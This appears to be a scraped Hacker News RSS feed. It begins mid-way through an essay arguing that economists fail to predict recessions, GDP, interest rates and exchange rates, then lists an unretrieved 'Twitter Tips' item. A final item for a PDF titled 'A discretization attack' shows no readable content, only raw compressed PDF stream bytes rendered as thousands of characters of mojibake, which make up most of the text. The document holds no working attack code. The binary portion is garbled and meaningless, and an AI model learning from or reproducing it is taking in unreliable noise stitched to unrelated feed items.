the 2001 issue of the International Journal of Forecasting, an economist from the International Monetary Fund, Prakash Loungani, published a survey of the accuracy of economic forecasts throughout the 1990s. He reached two conclusions. The first was that forecasts are all much the same. There was little to choose between those produced by the IMF and the World Bank, and those from private sector forecasters. The second conclusion was that the predictive record of economists was terrible. Loungani wrote: “The record of failure to predict recessions is virtually unblemished.””</p></blockquote><p>It’s hard to overstate the severity of Loungani’s findings. His&nbsp;<a href="https://www.theguardian.com/money/2017/sep/02/economic-forecasting-flawed-science-data"><span>analysis</span></a>&nbsp;revealed that economists had failed to predict 148 of the past 150 recessions. To put it another way, the experts only saw 1.33% of recessions coming.</p><p>Others have pushed their analysis even further.</p><p>Andrew Brigden, Chief Economist at Fathom Consulting,&nbsp;<a href="https://www.bloomberg.com/news/articles/2019-03-28/economists-are-actually-terrible-at-forecasting-recessions"><span>analysed</span></a>&nbsp;the International Monetary Fund’s predictions across 30 years and 194 countries. The research found that only 4 of the 469 downturns had been predicted by the spring of the preceding year. Brigden’s success rate of 0.85% is remarkably consistent with Longani’s.&nbsp;<a href="https://www.fathom-consulting.com/the-economist-who-cried-wolf/"><span>Brigden</span></a>&nbsp;writes:</p><blockquote><p>“Since 1988, the IMF has never forecast a developed economy recession with a lead of anything more than a few months.”</p></blockquote><p>These two studies, and countless others, paint a pretty damning picture of our ability to spot recessions on the horizon.&nbsp;</p><p>It’s clear that our&nbsp;track record of predicting&nbsp;recessions is pretty patchy. But that doesn’t stop us from making more. As a slowdown turns into a downturn, economists rush to reassure by predicting when more stable times will return. But how do they fare?&nbsp;</p><p>That’s the field that we’ll focus on next.</p><h3>We can’t predict GDP</h3><p>On 15&nbsp;September 2008 Lehman Brothers filed for bankruptcy.</p><p>Despite being the largest bankruptcy filing in U.S.&nbsp;history, the&nbsp;government refused to bail out the bank. Global financial stress quickly turned into an international emergency.</p><p>From its New York epicentre,&nbsp;the effects rippled around the world. International trade fell off a cliff. So did industrial production. Unemployment soared and consumer confidence collapsed.</p><p>7 months&nbsp;later, on 22 April 2009, the IMF&nbsp;published its&nbsp;<a href="https://www.imf.org/en/Publications/WEO/Issues/2016/12/31/World-Economic-Outlook-April-2009-Crisis-and-Recovery-22575"><span>World Economic Outlook</span></a>:</p><blockquote><p>“Even with determined steps to return the financial sector to health and continued use of macroeconomic policy levers to support aggregate demand, global activity is projected to contract by 1.3% in 2009. (…) Growth is projected to reemerge in 2010, but at 1.9% it would be sluggish relative to past recoveries.”</p></blockquote><p>These figures did not fare well.</p><p>Global GDP did contract in 2009 but by 0.7%, around half as severe as the forecast. In 2010, growth wasn’t sluggish but soaring. The global economy grew by a whopping 5.1%, two and a half times greater than the 1.9% predicted.&nbsp;</p><p>In an analysis of the IMF predictions by&nbsp;<a href="https://www.brookings.edu/blog/future-development/2020/04/14/the-world-economy-in-2020-the-imf-gets-it-mostly-right/"><span>The Brookings Institute</span></a>, the critique went even further:</p><blockquote><p>“(The IMF) got the numbers for China and India wrong. The numbers for 2010 were way off-target: The U.S. economy ended up growing by 3% instead of the forecasted zero, Germany’s economy by 3.5% instead of shrinking by one and Japan by 4% instead of -0.5%.”</p></blockquote><p>But it isn’t just the IMF. Take The World Bank.</p><p>On 1 January 2010, The&nbsp;World Bank published their&nbsp;<a href="http://documents.worldbank.org/curated/en/115101468337160604/Global-economic-prospects-2010-crisis-finance-and-growth"><span>Global Economic Prospects</span></a>&nbsp;report. With 9 months longer than the IMF, you’d expect their GDP predictions to be much more accurate. But they still missed the mark.</p><p>They predicted global GDP to grow 2.7% but in reality it increased 3.8%. 1.1% out. In China and&nbsp;India, they&nbsp;were 1.3% out. And in Japan they were 2.7% wide of the mark.</p><p>Clearly our GDP predictions are imprecise and imperfect. But that doesn’t stop us from making more. As society starts to stabilise, economists turn their attention to predicting more universal measures. But how do they fare?&nbsp;</p><p>That’s the field that we’ll focus on next.</p><h3>We can’t predict interest rates</h3><p>On&nbsp;14 July 2015, two&nbsp;economics professors,&nbsp;Maurice Obstfeld and Linda Tesar, published an article on the&nbsp;<a href="https://obamawhitehouse.archives.gov/blog/2015/07/14/decline-long-term-interest-rates"><span>White House website</span></a>&nbsp;espousing the importance of interest rates:</p><blockquote><p>“The level of long-term interest rates is of central importance in the macroeconomy. It matters to borrowers looking to start a business or buy a home; lenders evaluating the risk and rewards of extending credit; savers preparing for college or retirement; and policymakers crafting the government’s budget.”</p></blockquote><p>With interest rates being so important to so many, it’s no surprise that an entire industry of professional predictors exists to monitor the rate’s past and forecast its future.</p><p><a href="https://www.wsj.com/articles/some-investors-had-hunch-yields-were-about-to-fall-11560072600"><span>The Wall Street Journal</span></a>&nbsp;surveyed a panel of 50 such specialists and asked them to predict the interest rate 8 months into the future.</p><p>From a starting interest rate of 3.2%, the professional&nbsp;predictions ranged from a high of 3.8% to a low of 2.5%. The average estimate was 3.4%.</p><p>In reality, nobody came close. 6 months in and the interest rate had fallen below the predictions’ lower bound. And it kept falling. By the end of the prediction timeframe the rate was closing in on 2%. None of the predictions had come within half a percent of reality.&nbsp;</p><p>These may seem like fine margins, but half a percent represents about a sixth of the initial rate. That’s like having 50 estate agents estimating the value of a $1.2m property and nobody coming within $200,000.</p><p>And this isn’t a one off.</p><p>The Obstfeld and Tesar article&nbsp;presents the results of similar studies conducted in&nbsp;five different years.</p><p>In every single one, the&nbsp;forecasts fail. In 2006, the rate was predicted to be 6%, in reality it was closer to 5%. In 2010, it was predicted to be 6%, it was actually closer to 4%. In 2005, it was predicted to be 5%, it was closer to 2%.</p><p>The article concludes:</p><blockquote><p>“The decline (in interest rates) has come largely as a surprise. Financial markets and professional forecasters alike consistently failed to predict the secular shift, focusing too much on cyclical factors.”</p></blockquote><p>It seems that interest rate predictions are prone to flounder and fold. But that doesn’t stop us from making more. Despite our failures at forecasting one economy, some turn their attention to predicting the relationship between two. But how do they fare?&nbsp;</p><p>That’s the field that we’ll focus on next.</p><h3>We can’t predict exchange rates</h3><p>If predicting the ups and downs of one economy is hard, forecasting the relationship between two is doubly difficult.</p><p>Fortunately, financial institutions&nbsp;make an assessment of their success straight forward.</p><p>At the start of each year, many banks make a prediction for the end of year dollar-to-euro exchange-rate. In one study, Gerd Gigerenzer, the director emeritus of the Center for Adaptive Behavior and Cognition&nbsp;at the Max Planck Institute for Human Development, compiled the exchange rate predictions made between 2000 and 2010 by 22 international banks including Barclays, Citigroup, JPMorgan&nbsp;Chase, and the Bank of&nbsp;America Merrill Lynch.</p><p>Discussing the Gigerenzer study in his book&nbsp;<a href="https://www.amazon.co.uk/dp/1509843493/ref=cm_sw_r_cp_api_i_H6r5EbR6BYQMC"><span>Range</span></a>&nbsp;David Epstein provides some searing details into where the forecasts went wrong:</p><blockquote><p>“In six of the ten years, the true exchange rate fell outside the entire range of all twenty-two bank forecasts. (…) Major bank forecasts missed every single change of [exchange rate] direction in the decade Gigerenzer analysed.”</p></blockquote><p>Gigerenzer’s own conclusion was even more clear:</p><blockquote><p>“Forecasts of dollar-to-euro exchange rates are worthless.”</p></blockquote><p>30 years earlier, Richard Meese and Kenneth Rogoff, from the University of California, Berkeley and the Federal reserve respectively, pitted three different exchange rate …</p></div></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.alexmurrell.co.uk/articles/the-forecasting-fallacy">https://www.alexmurrell.co.uk/articles/the-forecasting-fallacy</a></em></p>]]>
            </description>
            <link>https://www.alexmurrell.co.uk/articles/the-forecasting-fallacy</link>
            <guid isPermaLink="false">hacker-news-small-sites-24521279</guid>
            <pubDate>Fri, 18 Sep 2020 20:01:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Twitter Tips Collection]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24521251">thread link</a>) | @thetimekiller
<br/>
September 18, 2020 | https://joshspector.com/twitter-tips/ | <a href="https://web.archive.org/web/*/https://joshspector.com/twitter-tips/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://joshspector.com/twitter-tips/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24521251</guid>
            <pubDate>Fri, 18 Sep 2020 19:58:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A discretization attack [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 77 | Comments 14 (<a href="https://news.ycombinator.com/item?id=24520781">thread link</a>) | @Kubuxu
<br/>
September 18, 2020 | https://cr.yp.to/papers/categories-20200918.pdf | <a href="https://web.archive.org/web/*/https://cr.yp.to/papers/categories-20200918.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div îœj="">Äûgó
†Æ~mL÷}¯î®)ç{MJÅªÚé^“2ñcéCQ®²^¥ºJŒ–É21zùíe*´Lüå&lt;«Òˆ ÎéÚ¾‘ìò�qS`w�ˆÆ¢E.œÂž=â$}Ý¤˜j´wP¨Š3ñ¨$700D‹ì)þvAæÝ”ƒG
È…q=zòwÏréŒê¬8±‘–“
'L&gt;£FÁoQ&gt;€ŽZ&amp;N/&gt;Mçžn0'YŠ²-*ˆµÅ\&lt;§Xjrâ5SÔæk‰Ââ[‰ÿ�
£N&amp;É¶6ÒJù”E%P«Öh‹êï-÷''÷îýÖž}ñ&lt;ÇcHî-‡«G¨.¹”ÇÝk_·Cì² ´å	,ßqìK½ø-)‘Ø×R¨ÂK=�AX&lt;
ûÁcÉiƒ�?nŠ×TïiämUÁ\p‘õBìå6o(æbÕ{À¹��†)O…#Äªœ“@ØÑÜàÁZà.pÅ¶²Æd÷·D\¼…uÑE5¿KÒõ4&amp;¾5
UÇCW…rË£•n:xît4ddp„ükh�,†gî-¹Fö¤Ž‰�óR9W%ùœìfwöÉ/•HI'Ð½mk4šˆ°”ˆÀi|lÑMG¸ò.9ð�†8¸ÈñBÄC8åq&lt;ËêÄ£�eÐ5-3`g1§WR&nbsp;³˜¨(H fO‚,’û¾Œo.’òcpŽáq^È¨&lt;ˆ)Í»È$Ñ*Å…k#`XCX(„¦\l{ýã“ Fß9	
?ëÝTD·î(®*ÈM\Š•ª¹T Q2@ødOñ'RE‘j
Ür‰ˆ(vù·&amp;$„pç'®üŸ7EÆ¬‰ö¤�¥~‡¡š#8Y*4ÿ²ðÍð'2&gt;…
!ÙëÒ‘(WX›áƒ´ýIÒ¤Ë_P�k
˜þ‘­N?:¿.«:•0Ó¸Ãô5V/£îë^ù¿äžLÃ
endstream
endobj
49 0 obj
&lt;&lt;
/Length 2629      
/Filter /FlateDecode
&gt;&gt;
stream
xÚµÙ’Û¸ñÝ_1•—PU#š÷á—­Äkg7©rycm^â&lt;`HHbL‰Zgüõé&lt;4œqì$5UÃFh4}+ô£›þBùV§ÁÍ€?½øãîÅË·qpSøe–%7»ýMTæç7YœûY^Þìê›¿{Ølã$öêÆT½¶Í—Mè)ÛtgF+kUµ‰JïŒÃ&lt;öâÍ?vÏxù¶¸)�f”!ým~Ä¤~D|ÀOÝ&amp;*¼Ï›(÷ô=‚º¿biêÙ£î5‚™Ww›-Nž;ËKÔåÂªçÛñÄ£yéõ}Ó
†§ÚÆê^ÙÁÑf
]sÆÃms&gt;ð²n°Bò¨Fn¯ñ†p»múešñ%.=3Xiƒ§”¥×íñ˜î´Ù†pÈ­gâ0[õÛ™cõI6TêÌÀÄ:lç `DÖxøË·I6kg~Ï0+ú^¡$,¼fÏ_�#'Ý7–ÁNæô&amp;Æª#]jëHñÝR&amp;8çåPxGE¢Ì�Õ4dx&amp;NU8èú~œ¨lûÀ‹•1 BÊ5æÊæ‰ŸF…»…Ï…Yìy¸dè×s­{cÕ¹fy‚tèŠq4Ê« …„�&lt;®1Í]ß�ÁQ-˜ëõoCÓ;¼±Cý dG6ÇW¼ÀóÐ{æ+ô“4_²5×Í#õvÇé&amp;&nbsp;d
9ïy¼—µƒ¡“a-›T
u¡ã@ep{8NÍOpÛ&gt;7&nbsp;•D’™Ô¾k[6*¾&nbsp;HFŸAïÛ…ú
ëæ¨ÄŽ^]Ùo˜ÌÞ(óË&lt;��€‰Dñ?aþŒÉ#»7Ý±Ð#ô¸ß&nbsp;÷l�ˆXjbàÖîU+«ÐÌñ;Ú
m%©éÚçáëîlšš¼I”$žöþ­ì&gt;ê5)´&nbsp;<m¥·wÊ€¡�?@dÄû»0ôÌpwj@™€4 ß¾Î²'â¥ä�p="�ï~þ°ã©÷º�Ýþ2(ö:Ãi�¡×$‹C¯.G\…vÇÞÔ|Õ×ÍçˆùU\Ô?ueó1H<òý/¯" ýçvËï´8ü[^ö="" Û(beËq¸àÞÃ0fñÇè8¦kà�Ü®w½:i‹ÖÂ«¬yÅ <#‚$ómÄƒ¿<Ü9[‘äâ|v¡óË$sw™owºoÃè±�jr?ˆÇkÃ+¬�Š€t.håyñ­ä›i…a”¬ËgÆ@<izŸ�m«%…ƒw»¿¢,~—%~‘gß&®À��’ãÎ¶Ži‘åcæòÜ�Ëè+7Ša¹b1Ëóÿ‚bqe1="" Ê¬ˆÂï£¦ùe\.#?qî�Éƒ²iî§Ó#?o‚yî'eþý6(Þ5É¯�Èatü1Íš‹!°}s½b´3&ÀwÍxý="" ;íðyjfÝ017m˜Ódü¾Œæ„åø„Î]ú)Š�ðÕ="" Úayò¾€"’0ûq="" wg�nßicl³-«ÿ«—Û¹¤!b¦Á–="" uŒqü1º0Éw="" k(ýc¡ƒÛ_1^d�›^w½Þ~øÛûm‘x="">£&amp;™ãh&amp;s&gt;Ä2
`´[þ?”¹&amp;n`›.”»øsý‰èÔ.ûïË@»’È£L�Ùj9YO°<qvñü2›7·< “b€ iˆºð_rˆž— í="" ¶,ôÙ­liüükÌž2óaŽr×ÓËz="" §Ç»e%oüzÞ«="" xt×Æ¼{‹)¶{,”cÇ#Å¦lvl³ý2Î%³k�Äñy“2�Üuîy”pdf¢Ž£z[Õ´2e‘¼”ô�vË¤v—[&uì�íÏb—o\="">"#éÚÐe¼,×C×"žÝˆ“afWu]�¦%Eh‘¢Ã‚Ÿ”„&nbsp;¨‰+„ÜÇ0N¸&amp;&amp;ïƒÎçB�’Ü!xæ•SEò;W«P=	Ð¡á‚×ðÊ'ÒÒYIã¸‹QœÝª»V3F„&amp;Õt!+Cy|»jÁh©ƒ1ÉC¡Â4—r_-Ë�B,mã�Ò�ÍÝ¦ˆñâq–yMÛÆöL3Ë�«È²&amp;oyÉ—âªˆqP·=êbÏÏÊ1BŸÔYîPóº3Lìå1”o÷k…û˜mã"b¾îGáfJ+oAþ!.ÂÃ0ˆyòŠá‚ÃÌ/†ñ’aXGÃÄÈp~Í°ˆ™ÃG,Æ]ÉçáÄ'þXÅºdx¨øs×wªvTÚŽÝÎ'Ybe'W3Ñ¼1Á•Ñ…•³2�Ãƒ¬GE«Gb+7³cH¼U­÷úlÄ×±:&nbsp;€gí[«Àßu¨pQT’�a±z‹½
Dý8`ôCèÍkž™´Ão“ýSÇ(bË¹êÒYŠüˆšjPÌû¸ÌªþÅ‹ÿtÛ@PÍüìï³2Œ¹Ús¯;U„�G‰JVM�$,œ&amp;a¤sÇ3¦ÍçtØ‹[³
jZN�¼‚:yÎh‚@‚,1ÍéÒ6•‹§à1d…xX2�68£ŒNZ&amp;ÅwÎMÁü²=pëˆ¸(»ÖíÐ”DØt£PÛAÕÏcŒZøåD!*Ém¾¶|‘$ f±Íé&gt;Â³”­’ñÃ™LA{ìÌj$`¢†{SÇÉµI“Š»¢SZBÉ²3°tÐçŠžó„1?�õ¸®Z�½ÈŸ…è©9PBb—ÑÔ
„ú¸¶Y/î	û&amp;ã*s¯E'Áþ™è.N±yJÌ«Ì=ñ¿&lt;§çfx6³W&lt;ÙìùYdƒðRZ|B+{�‚q�ž¯¥xÆ1POÛŸ¾dúH%R$š_½å)4Eê7ã€[B²iüÙ&amp;;{Q¡À© BcJ…‘g:ñõˆàš�ØŽ|	ÈÀðwßcú„PÕõ½–¦.
)°q’@ÊÄ»X½î&lt;µ;Êš“âb¢¸ÊøG4"Ú3ß°â‹(_Í]Ã&gt;ÉAó-cx´H™ÆHµ*]Sœ{,iÄZÎæœböÕÎ)ïÍ¥ƒß£8C¦rt¼‘Ã^ù"AˆËÑ�—R«aäéû†}w‰?NÜ2äzÂõPÁ+ÒÕ–qé\8Rì›OòP˜ÃƒÅPÏ‚
É£¡…c(f'²Âî”T@øˆ¤,9KÍ±˜ŒŸ×äYÊ„oXŽµ
0e$í„IJŒ`²»3ºç¨Â	°Ät'Áñ�.ÉŒ@ÆM»LºJê,ogùÔ“!rí
RéúP²Òã&nbsp;aÕªæ4NÕš!0MFÀÆ˜Ñí,Ý`Ü½høÓ½ƒ|ÞÏ¤1K7ŽéÝ³ïRô.XV±
»B0(ŠBîÁÅf1Y/,á+Ý2ÎèÔQí	r6ÙÞJ»ãyá¢
×ZúIeÅd÷ªâÔ&gt;¤ŸøðËÌeá‚¹,™�™óyð“ówD¤©ñfXí‘\GÕA”}‚ä&lt;øÑQQç¯dþ!þÙ&gt;H�?ãï¦Ò«§©YðÂ1ÕÏI¸t0€ç; 4«³atRŸ¤ñ¹Ÿ$�…õ”aºØâ×Í7ö·í�u;Ž]wì¹®{ü¡©^¶}fÖ�xé²éã¾ov/þ
¬&lt;þe
endstream
endobj
79 0 obj
&lt;&lt;
/Length 3415      
/Filter /FlateDecode
&gt;&gt;
stream
xÚ­koãÆñ»…�&nbsp;ˆH{Ü_WäÃ]’K´A{ç´.÷�’ÖkŠTHÊŽúë;/R$M_ê´0`ÎÎwgggçEieüiynWÁâ€ï¯ÞÞ\½zgƒE¢Ò(r‹›ÛE+
PdcÅéâf·ø¸t×k«c³ü6+s_ÀÀÙå
ŸfùÖ×eÓú¼¼þtóC?ï«w&amp;]h­Ò048k°X›P¥�á	ÍõZk.ßÀq¸ÜV‡cVçMUòøëOEÖú#ÚŠŸ·ÙµÕËüWÕŒúñæýµ5ËŸpùWï’E
;1Q·¦U©Ö¼æ›$7Q´ÌËÛª&gt;dmŽË™(Ú}Þ0Ôøí…¼�G¼ôEu
�ÇŽÕ3p[BÈË;Fy)DžhuÞ¶¾ì–MÃvL²¬ò­¼TÝ2:Ãá&amp;X�¼‰=òž�À¯Àm¾Íð@`øãŸ?Ü /k/uË¤v­—™XÙ¾éHž_jò¤—kØû	ä¥…˜´ËÚŒ¹e^Ø¾*SÜÖÕ�?Š
Ê�à5šƒïÑ"\&lt;8kµŠ4Ú—'æ3<hp€ãŽõémpÑx;·h.±Ë ÏÚ%nyw§r·6Œƒ}ùõ&kÐ°�îËm}="">òY#KsÚò¦�q³bŽ-Ì@»¥óEž›}íý[ŸÕ
sdÍÜI�ƒ»bÂÞô°F:’q‘FcÒ¨	6 ¾@ŸÚ9[÷»ôIk�‘Mc{@èàÛ:ß²d?aPg`45ÓÚ}VŽ^Ûž·…_÷Jã³Òa¤tªÇ
âiaB
š¶‘Y6l]~›ÿhv]œ™°Í�°`ëm…‘D³‘‰ƒçsï˜å±85�6E¾]ß£¤dûçÑAF,'¾)R:‹�ÙnY«a¬ÿõXd9Ü²’&amp;Ú1ž#&gt;_rŽ6U	¨èåç¸âµ&gt;ø-J &amp;
£ì'Åà
98”·wpˆ¾¸[¡¢S�ƒÓÊj3&gt;¸‹·^±ÓuÑ@¨0TÎšN¨Ç¼ÝW'&lt;0ž~ºJ6ŒÅû	n©¯‹³’Îå„èrB�÷£mžzx$*I“�¬µ,¬Ã`ËÞµf¸g?)Òêw7W¿\i�]ÜaÊÀhŒ‘?‹ÐÀ"”…U‰ó°°.T‰A½‹WÇsE9WßKdué@Ú$QÌìR§R#Æus�ÞjS�;Ö	–f +1ôé0†1GÜøm_¶Laå-´aÜmE\Œï�R&amp;ÎéCç‡,Íù¡‘£gã�&lt;Ú³M)&lt;CD/·`<w¼vn²�—æï�Ã¬5Üº$ û="">´Äw4¡˜ó-Ü­{¶œ@¥Šòø9a¢^Xë&lt;çšI°¢óŠù7ý»árçÑù”9jEÈ8�TÀ…oÕ0jO&amp;Vïx”ÉÆß|÷a­MÂÈ¡w!Dãù¥íþµlDyµbšaƒE¤ÒØ&amp;dä`™à­VEºÛLÎ7oh_:T˜m­Œb3ë_NYÙž|²&amp;5�¹‰—jN½I¤ùð˜“,2*Ö,X4’®‘ŸŠ´eÁ„ñk™.d¶ÙàZ$º»ËßÎmÐ¨Ðõ)ƒä"MÛïŽ›í¡!Ó9�ÝÃÑKŒåvþÉ±ù!ogÄÒ&nbsp;®È…Ÿ,V©ë½�âé.6L2\TïÜÄŸ6bÔ&amp;µùS3ÙR7ìÌ<f^�ÝÐwŒÞô ™©5#;z3’Äšd»eÒÅš‡Ø0ÿŸpþ7�Ø5b&Œ˜gÙoŽÙÒÜ5:8äÎÐÁÏ™dÐoÛ9Šµ;b¸ÊÔ¨Ÿb˜€Ýº±°ÿ”kŠqiŸ="÷¼h*ÆÝ��*lÀPŠ¬ó³À5ÔrÃ<˜Ä#iŸßqrÆSGN½æŠ‘—”èeéY¿Ls;Hëô07Ññ%&amp;È�Uµ=5l›ÀLi€~êÃ§ùÁn��£ø�wyÝ´+!R²­yÓø„À„É$òIÔaü0¾L“,H÷�" jjšfl|[¬]È™3þ%$õŸ)ggvd¬~²Ài~ð.Ýç0Ù‡s‹¶²n&Ìx="õ‘6ÃØÄÜþ×ìp,º)a¯3&amp;?õ·�MuË‚9J®?òXV¤{-‹÷‚b£x�I]UîV<Muª…¥’sËÅ»ŒÄ'ÛGXª9�9‡°PrWÛð–ä6Ñ[mFép<5V+!^êm`¹">@í
Q�•<eó@nz½fŽŸµuÝÒ!ß`¡"bteæ\l[ûòŽ<¸�1`÷{§oµ�„ëÌ˜êÁ×÷yq|ÁÃ—$ê‰vq”v^?tÝ«3¹àÔ��ë¯?òÚ¨>Ë¯v}Q!QÛgí#+‰{4’ë‹�H­2fRó57ËÓŸšÒdox
Ð
žn«îÖÁ ˜áL²VF]Ü‹3b}¯x(~C.­ÀÕ©Ø•_µâŽÜúºÎù€P&nbsp;SÍ§–sÍ¨üv&gt;ÚŒ½k:0i~õ(ÿåâµlÅ…GÊ
O6h2ûÂJ&lt;
”¹t6þ7ÃÀµÑ0òÛ^,	Sér—³y+yy¿bøRÀ@¼ÖJò�R±hìz;-OTŒT°
qÀÍà¿PüÆS¾ü®¤NÀÜgCh3XKÅ]M–õ(u`€©´¬m5wì]Üv&amp;ÇƒPYµìªRP¸èª£vKü|œ�(+ÏÀ.kª¼œqK¨õK™µÏÒT_0ðƒ1)$ø±þ?yÃN•º�Ü(Ã"Ù$cµÕP_î0É³ÝU@ˆ:`-\B¡Ù	@ ¦pÌ7?Çë‰TJ'bL'xL=S|‹#vvð—™ÞsåÏzjÿË)¯=ÈÒÎöÑ.Ö‡OËLÀQû(vT^Â\Î«ÎqáØ®˜
òŒôˆ’ü±}x@|‘ßó­?Ÿt�%l&lt;ä;a”Ä!çR&lt;§7;Õ"öó1×v„ñØä©…õ^âv‚âQßxqÉï¶"É’»	G²S¿‚Î&lt;êÔÒRxBÄ©á³0»Ëò’ê‹8^ž@ó�HäeK‡†tªsâ®	ø©nšmÕ½H­ðx�EÒÔm›mïñ.ã¨»¶ÈN]îÙ&lt;9VZ5Í»C¦n[ÁN,óYÛnƒ]qÅ3HîŒ,ßH¼[øÇß¤l¦)˜
I¨äA’H2±AÊ&amp;Êñ[5sÆÂQÛÍ”2€†õGU!2j&amp;Èµjù4/äHvzi¶ýàB$Ñl•?µ¢i•¯d¡¦¥ÈPVKy8Ð{Y9F…‘ŠÒtšX?-öƒtºÀÌmAãLPÌÿve9ØBxéªÂ´�û|»g�Z¨ðD¡&nbsp;j¡&nbsp;c
A:£ë¡&nbsp;¨¬¨?'¯Ñ�Šb7’×éy1YV†JÙP�±K¿ºäOIn®à@ôXk&amp;²ÓvðpùÁTöåžiðæÀÞ;l’�(œiú—¨ íýÑ×3â�&gt;0Oj°ÏÎËðW0÷L+´*ˆíØD&amp;»Š“é®ÓU8øk†� ¡°«I:‡�#£Ohbù@Op‡nÉ¾‡Ô½E&nbsp;+ôõãëJÚNH÷euºÛÏŒ9Ø0âÎ@°ó"¿¥O!Á%'ÇÁ7Ã&gt;'aŒ¼L-WÚ=ëÎ—¥ïš
¦¢f*û~4�2+fà®ö×ªƒ/±˜qÍÔõ,‰µfë:±,º)È¥¶^˜6(Ñ™aé°ÜyiÝO3
Ä‘ÔðJ�Í%e8†ÍõJú„Ñ}ž¹´ßBtß1š“:Ì�ñä¶ÅiÇ-k¤ýå
¾ÿ
¤nÙfôñ1Ô�'5ÖÉ¾²âÜpæ	è÷èæÃç^ÎÛÏ´ÞÉëÄ®Š|ËŸÆ] 
�åœüPA–bQÄÇ¸ºâë€)|Ñ’¾×·}KÞ3,à!r­xÔ¯Ð}ø¤ƒy¤zìv˜¼�³ë÷�¸}ˆŒ@RH×ƒG?Fù"ZX¹ÙWõo4kÐ˜ÃžÊKAŒ3à‡vlÄ)f½ÙËÙ9¬x�Ìé&amp;d#Äg{8$h-ÜÁówÞ�SI4¼ô8¤K�ôA›ÝèC�±Ê¹&gt;ÃjÊ¶&gt;£ÐÎøÄ$	ú®úØ$�y~¾­oØKÒ’œ4L–‹­
/žÛ€°q&lt;×½Géá’©ÕR;˜XA:¾Ó\´‰ô•&lt;é~!]HþºžtåÝS	W©JXëg‚ßåÂ¡t:0áp~‘D1Ž¾±#À§�$ƒÓ¦¡x¿Z\iw¾äÔùú9£â0�I|ÅÓCH_åxþÐC§ÜE­¿}
á0	ïN�Ö˜(|f)­ŒµcóŠ£¹ŒÁ¥ÊmÚtvÞÞ³fú÷ç�¯ã(™MPA~Òkçe“dèôûC|ÎoÿXu�ä€«Õ5ÀUŒ’ÿ^ãPv½ÆÉÁjnCÐM§uºÉ–0ÉãßQ{”(Ä
„M÷“y�¾é¾žVž’9~iúwÅà•Zó¼Á…äeVýëDå@Öñ³?¸nHv±›õE±Š.uâç|‘‹)Ëº|]ÇÙ) �Ër_j—ü|"¸aOýRIs#ÐØzóõzô3‡ùªõ»›«ÿ@ß
endstream
endobj
99 0 obj
&lt;&lt;
/Length 2881      
/Filter /FlateDecode
&gt;&gt;
stream
xÚå[ÝoÛ8Ï_aÜ“Ô¬øM-p·‹ëâv�Û^›Û—¶ŠÍÄÚÚ’kÉÉ¥ýÍ�”-ÙŒšhu8´E�Š")r8¿ùâŒC	›¥ð�†çbs��”ðÙîvÖ6ßü½øúóÅ�W/_ñtfH¦”˜]ÝÌX¦¡­gŠk¢t6»ZÎÞ%»œsÁ“eQ/v¶)&gt;_Ò$oŠªôÝyÓä‹K–%á�jžÈËW¿|açøèËWÒtˆ™ÓŒ-ØlÎ8Q”zjêâ³u;üýêâÓõ'žQF‰�b¦hJ´Á£¿û�Î–0ö®ž™Ù½›¹ÁÙ)Éd6[ÏÞ^üËó&nbsp;·-eŒa`)AReÂ®ûëMQ×îÔT2“lóKø—olcwõ9A¢ÀÁ	b@�Ô¼OÐÎÞØ�-Ö£pS!;ÿ²um;ÿ´ÏËf¿ÁN–üT9‚íüíï¯#üKSÂ8wäJC‡èeYF”É&nbsp;ý(S‹©™JÑ-nš²Ça“°¦`ü¹lÙˆàÖÝu
²9×JÑ„2ó8J#÷�ÃÔÝÿ]«DÀ
^Ü]Ó‰»àÝïAãŒ¸ï¸Ð¢3vƒv´¾"�ßZ�;¡ë=åb±ÎAˆù€«ƒ‚1€’Ihø£y&nbsp;D:”1DÀ¶S%Q½%ò\íË¥,——s!)&nbsp;EÒå\ã¨ˆÂÕ£b,\æéhIÂSù(ZRž£•¯ýØÖ)0XßTlðú%´—û|}„SÎúhšL&nbsp;©5‘@Í$h0tæ²lvûíå\¥F%Jò(Ç‘‡²KÂX(›JóTËˆMæIq–Þ0å­ÿlõpí;–ƒjšÑ!`•"R¨i€U1\ø]›ÕÎÚk›ƒËbÁ¬^ç×èŽ£#Žn—ŽÑvu2tyÓÔaÈ8€LJð¼zÈ¤!FK¿+ªbkµ­Y*ŒÒz²qtÄ!ëÒ1Z!'s…¼UÈ«K0Kùõ:O´°fY•óuu9%ì"Ê…‹�zˆÒ”ÉH…!0Ó@* 2§êézÑž”€ê°}GCÎ.
ß’}�CkÌ´®$*›Z®`žöÛ~|¸¶,D¬4Ñj(dGAØ.c�ÕSÅ@ŒÆÔÔwØàÂò çÏÁ�ù@}™$YÖ^s�!?›¼(@GBÄ.	£ý#�J;‡ÝcLãK‡Ð¢&gt;NŸ-*IÊÃ¶¥½_U[&nbsp;Z¦\¡Ex�#"ŽW—ˆÑxM¥tœuðúXºtÂ}Hñ8øðÞñ%}“zPßRžO‚`*HjzWG4ŽÀ7Ž‚8|
þÿ×Fý§®�](Ã‘2ÍÒÂøX|
(EÆ	´ý¶7»jY÷§b‰ˆÊ‘D¡ìQ0K1™&amp;šÇ-çËW°B7C*9¯ü`KÒh_]f,¸M‘ª„Jü·=" .Ôâ@ÅÛâ³Å+�Î’êÆ?�)Ï0P”aÀ.ö»¢Añà{yco}˜zœ‡çyX]€SàM¦µrÜ•´ÍŒ“¶þÜçðÎýPŠW­ÎDâ—ýçÕ›{ç�{b®^ïŠ
Ú}!’¢öÏz»Â\ónYb™÷øŸµ¥ß½'Æp&gt;ËZ&gt;†ÄÇ9‘Ü‹X˜–—ËÈRnKLµsÚ ?²ƒ3<!--ñä¾qVpð4Æ�Æ�†¦áG±8då"òºÃõð�æœSbN¸~0×‘ƒi¢dv<˜×¨¡’ÁðèlnˆÌp¼�«§�ÅŒœ¤‚  ¬Fûòç*SPt°t]ŠþG%¤üð4%A-£ò	%Ïl¢Ëvo×'–Fî‡©»ÿWXBÌM
